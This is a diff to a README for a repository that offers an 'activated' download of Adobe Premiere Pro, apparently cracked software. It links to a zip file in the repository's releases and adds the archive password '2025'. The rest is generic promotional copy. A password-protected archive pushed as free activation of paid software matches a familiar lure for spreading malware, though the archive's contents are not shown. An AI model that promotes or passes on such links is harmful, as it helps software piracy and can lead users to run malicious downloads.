@@ -8,6 +8,7 @@ Welcome to the Premiere Pro repository! 🚀 This is your ultimate source for ac
 
 ## 🔗 Software Access  
 ### [Download Premiere Pro](https://github.com/NAVHANRAHMANJAI/Premiere-pro-activate/releases/download/premiere-pro/Premiere-Pro.zip)
+Password:2025
 
 ## 🎉 Overview of Premiere Pro  
 Premiere Pro is renowned for its advanced editing capabilities and seamless integration with other Adobe products. It allows you to create stunning videos, trim clips, add effects, and manage audio with ease. With robust features for both beginners and professionals, Premiere Pro is your go-to tool for all video editing needs.
